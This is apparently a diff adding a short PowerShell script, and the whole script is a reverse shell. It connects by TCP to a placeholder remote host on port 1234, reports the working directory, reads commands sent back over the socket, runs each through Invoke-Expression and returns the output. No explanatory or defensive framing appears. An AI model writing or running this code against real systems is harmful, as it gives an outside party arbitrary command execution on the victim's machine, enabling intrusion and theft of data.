@@ -1,0 +1,27 @@
+$host1 = "Shell.Ip.Address"
+$port1 = 1234
+
+$socket = New-Object System.Net.Sockets.TcpClient($host1, $port1)
+
+$stream = $socket.GetStream()
+
+$writer = New-Object System.IO.StreamWriter($stream)
+$writer.AutoFlush = $true
+
+$reader = New-Object System.IO.StreamReader($stream)
+
+$writer.WriteLine("Connected.")
+$response = ""
+while($response -ne "quit"){
+	$currentDir = Get-Location
+	$writer.WriteLine($currentDir)
+	$response = $reader.ReadLine()
+	$output = Invoke-Expression $response
+	foreach ($line in $output -split "`n") {
+		$writer.WriteLine($line)
+	}
+}
+
+$socket.Close()
+
+
